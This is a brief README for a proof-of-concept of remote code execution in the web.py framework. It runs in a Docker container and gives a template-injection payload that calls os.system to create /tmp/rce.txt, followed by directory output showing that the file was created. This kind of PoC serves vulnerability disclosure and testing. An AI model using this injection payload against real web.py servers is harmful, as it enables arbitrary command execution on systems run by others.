Webpy RCE PoC
============

Start the container with `docker compose up`. 

Use the following payload: `${__import__('os').system('touch /tmp/rce.txt')}`

You'll then see the new file in `/tmp/`:

```
$> docker compose exec webpypoc ls -lha /tmp/
total 8.0K
drwxrwxrwt 1 root    root     4.0K Feb  4 17:04 .
drwxr-xr-x 1 root    root     4.0K Feb  4 17:03 ..
-rw-r--r-- 1 appuser appgroup    0 Feb  4 17:04 rce.txt
```